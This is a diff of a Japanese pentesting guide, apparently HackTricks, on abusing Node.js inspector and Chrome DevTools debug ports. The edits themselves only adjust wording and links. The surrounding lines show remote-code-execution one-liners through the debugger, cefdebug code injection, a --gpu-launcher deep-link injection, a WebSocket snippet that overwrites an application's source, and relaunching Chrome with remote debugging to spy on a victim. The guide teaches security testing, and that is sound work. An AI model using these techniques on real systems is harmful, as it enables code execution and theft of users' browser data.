@@ -27,7 +27,7 @@ node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
-プロセスは、**CEF**（**Chromium Embedded Framework**）に基づいており、**デバッガ**を開くためにパラメータ `--remote-debugging-port=9222` を使用する必要があります（SSRF保護は非常に似ています）。しかし、**NodeJS** **デバッグ**セッションを付与する代わりに、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を使用してブラウザと通信します。これはブラウザを制御するためのインターフェースですが、直接的なRCEはありません。
+プロセスは、**CEF**（**Chromium Embedded Framework**）に基づいており、**デバッガ**を開くためにパラメータ `--remote-debugging-port=9222` を使用する必要があります（SSRF保護は非常に似ています）。しかし、**NodeJS** **デバッグ**セッションを付与する代わりに、ブラウザと[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を使用して通信します。これはブラウザを制御するためのインターフェースですが、直接的なRCEはありません。
 
 デバッグされたブラウザを起動すると、次のようなものが表示されます：
 ```
@@ -35,24 +35,24 @@ DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4
 ```
 ### ブラウザ、WebSocket、および同一生成元ポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-ウェブブラウザで開かれたウェブサイトは、ブラウザのセキュリティモデルの下でWebSocketおよびHTTPリクエストを行うことができます。**ユニークなデバッガセッションIDを取得するためには、初期HTTP接続が必要です**。**同一生成元ポリシー**は、ウェブサイトが**このHTTP接続**を行うことを**防ぎます**。**DNSリバインディング攻撃**に対する追加のセキュリティとして、Node.jsは接続の**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを確認します。
+ウェブブラウザで開かれたウェブサイトは、ブラウザのセキュリティモデルの下でWebSocketおよびHTTPリクエストを行うことができます。**初期HTTP接続**は、**ユニークなデバッガセッションIDを取得するため**に必要です。**同一生成元ポリシー**は、ウェブサイトが**このHTTP接続**を行うことを**防ぎます**。 [**DNSリバインディング攻撃**](https://en.wikipedia.org/wiki/DNS_rebinding)**に対する追加のセキュリティ**として、Node.jsは接続の**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを確認します。
 
 > [!NOTE]
-> この**セキュリティ対策は、インスペクタを悪用してコードを実行することを防ぎます**。**単にHTTPリクエストを送信することで**（これはSSRF脆弱性を悪用して行うことができたかもしれません）。
+> この**セキュリティ対策は、インスペクタを悪用してコードを実行することを防ぎます**。**単にHTTPリクエストを送信することによって**（これはSSRF脆弱性を悪用して行うことができる）。
 
 ### 実行中のプロセスでインスペクタを開始する
 
-実行中のnodejsプロセスに**SIGUSR1信号**を送信することで、**デフォルトポートでインスペクタを開始させる**ことができます。ただし、十分な権限が必要であるため、これにより**プロセス内の情報への特権アクセスが得られる可能性がありますが、直接的な特権昇格はありません**。
+実行中のnodejsプロセスに**SIGUSR1信号**を送信することで、**デフォルトポートでインスペクタを開始**させることができます。ただし、十分な特権が必要であるため、これにより**プロセス内の情報への特権アクセスが付与される可能性があります**が、直接的な特権昇格はありません。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
 > [!NOTE]
-> これはコンテナ内で便利です。なぜなら、`--inspect`で**プロセスをシャットダウンして新しいプロセスを開始する**ことは**選択肢ではない**からです。**コンテナ**はプロセスと共に**終了**します。
+> これはコンテナ内で便利です。なぜなら、`--inspect`で**プロセスをシャットダウンして新しいものを開始する**ことは**選択肢ではない**からです。**コンテナ**はプロセスと共に**終了**します。
 
 ### インスペクタ/デバッガに接続する
 
-**Chromiumベースのブラウザ**に接続するには、ChromeまたはEdgeそれぞれのために`chrome://inspect`または`edge://inspect`のURLにアクセスできます。Configureボタンをクリックして、**ターゲットホストとポート**が正しくリストされていることを確認する必要があります。画像はリモートコード実行（RCE）の例を示しています：
+**Chromiumベースのブラウザ**に接続するには、ChromeまたはEdgeのそれぞれに対して`chrome://inspect`または`edge://inspect`のURLにアクセスできます。Configureボタンをクリックして、**ターゲットホストとポート**が正しくリストされていることを確認する必要があります。画像はリモートコード実行（RCE）の例を示しています：
 
 ![](<../../images/image (674).png>)
 
@@ -63,7 +63,7 @@ node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) は、**ローカルで実行されているインスペクターを見つけ**、**コードを注入する**ことを可能にします。
+ツール [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) は、**ローカルで実行されているインスペクタを見つけ**、**コードを注入する**ことを可能にします。
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -73,14 +73,14 @@ debug> exec("process.mainModule.require('child_process').exec('/Applications/iTe
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 > [!NOTE]
-> **NodeJS RCEの脆弱性は、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を介してブラウザに接続されている場合は機能しない**ことに注意してください（APIを確認して、興味深いことをする方法を見つける必要があります）。
+> **NodeJS RCEの脆弱性は、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を介してブラウザに接続されている場合は機能しません**（APIを確認して、興味深いことを見つける必要があります）。
 
 ## NodeJSデバッガー/インスペクターにおけるRCE
 
 > [!NOTE]
-> [**ElectronのXSSからRCEを取得する方法を探している場合は、このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
+> [**ElectronのXSSからRCEを取得する方法を探している場合は、このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)
 
-Node **インスペクター**に**接続**できるときに**RCE**を取得する一般的な方法のいくつかは、（これは**Chrome DevToolsプロトコルへの接続では機能しないようです**）を使用することです：
+Node **インスペクター**に接続できる場合に**RCE**を取得する一般的な方法のいくつかは、次のようなものを使用することです（これは**Chrome DevToolsプロトコルへの接続では機能しないようです**）：
 ```javascript
 process.mainModule.require("child_process").exec("calc")
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -90,13 +90,13 @@ Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
 ## Chrome DevTools Protocol Payloads
 
 APIはここで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-このセクションでは、私が人々がこのプロトコルを悪用するために使用した興味深いことをリストします。
+このセクションでは、プロトコルを悪用するために人々が使用した興味深いことをリストします。
 
 ### Deep Linksによるパラメータインジェクション
 
-[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)で、RhinoセキュリティはCEFに基づくアプリケーションがシステムにカスタムURI（workspaces://）を登録し、完全なURIを受け取り、そのURIから部分的に構成された設定でCEFベースのアプリケーションを起動することを発見しました。
+[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)で、RhinoセキュリティはCEFに基づくアプリケーションがシステムにカスタムURI（workspaces://index.html）を登録し、完全なURIを受け取り、そのURIから部分的に構成された設定でCEFベースのアプリケーションを起動することを発見しました。
 
-URIパラメータはURLデコードされ、CEF基本アプリケーションを起動するために使用され、ユーザーが**`--gpu-launcher`**フラグを**コマンドライン**に**インジェクト**し、任意のものを実行できることが判明しました。
+URIパラメータはURLデコードされ、CEF基本アプリケーションを起動するために使用され、ユーザーが**`--gpu-launcher`**フラグを**コマンドライン**に注入し、任意のものを実行できることが判明しました。
 
 したがって、ペイロードは次のようになります:
 ```
@@ -106,7 +106,7 @@ calc.exeを実行します。
 
 ### ファイルの上書き
 
-**ダウンロードしたファイルが保存されるフォルダ**を変更し、アプリケーションの**ソースコード**を**悪意のあるコード**で**上書き**するためにファイルをダウンロードします。
+**ダウンロードしたファイルが保存されるフォルダー**を変更し、アプリケーションの**ソースコード**を**悪意のあるコード**で**上書き**するためにファイルをダウンロードします。
 ```javascript
 ws = new WebSocket(url) //URL of the chrome devtools service
 ws.send(
@@ -128,7 +128,7 @@ downloadPath: "/code/",
 
 実際の環境で、**ユーザーのPCを侵害した後**、Chrome/Chromiumベースのブラウザを使用している場合、**デバッグを有効にしてデバッグポートをポートフォワード**したChromeプロセスを起動することができます。これにより、**被害者がChromeで行うすべてを検査し、機密情報を盗むことができます**。
 
-ステルスな方法は、**すべてのChromeプロセスを終了**させてから、次のようなものを呼び出すことです。
+ステルスな方法は、**すべてのChromeプロセスを終了させ**、その後何かを呼び出すことです。
 ```bash
 Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 ```
